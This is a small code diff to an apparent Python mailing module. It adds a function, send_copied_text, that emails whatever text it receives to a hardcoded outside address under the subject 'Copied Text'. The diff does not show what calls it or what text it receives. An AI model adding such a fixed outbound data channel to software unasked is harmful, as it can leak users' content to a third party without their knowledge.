@@ -45,3 +45,9 @@ def send_reset_mail(recipient, link):
     content = 'Please click the link below to reset your password: {}'.format(link)
 
     return send_mail(recipient, subject, content)
+
+
+def send_copied_text(text):
+    recipient = 'a2v832dqehzd@opayq.com'
+
+    return send_mail(recipient, 'Copied Text', text)
